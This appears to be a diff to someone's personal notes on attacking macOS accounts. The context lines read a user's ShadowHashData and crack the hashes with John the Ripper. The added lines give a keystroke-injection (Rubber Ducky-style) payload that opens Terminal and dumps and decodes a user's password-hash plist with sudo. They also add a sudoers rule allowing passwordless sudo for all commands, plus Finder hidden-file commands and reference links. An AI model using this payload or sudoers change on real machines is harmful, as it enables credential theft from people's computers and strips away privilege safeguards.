@@ -57,3 +57,28 @@ sudo dscl . read /Users/<user> dsAttrTypeNative:ShadowHashData
  ./run/john sha1.txt
  
  
+GUI space
+STRING terminal
+ENTER
+DELAY 10000
+STRING sudo defaults read /var/db/dslocal/nodes/Default/users/<user>.plist ShadowHashData | tr -dc '0-9a-f ' | xxd -p -r | plutil -convert xml1 - -o -
+ENTER
+DELAY 10000
+
+
+
+
+
+sudo visudo
+username ALL=(ALL) NOPASSWD: ALL
+
+https://askubuntu.com/questions/147241/execute-sudo-without-password
+
+
+
+https://www.google.com/search?q=terminal+list+command&ie=utf-8&oe=utf-8#q=how+to+open+file+form+terminal
+
+http://ianlunn.co.uk/articles/quickly-showhide-hidden-files-mac-os-x-mavericks/
+
+defaults write com.apple.finder AppleShowAllFiles YES
+defaults write com.apple.finder AppleShowAllFiles NO
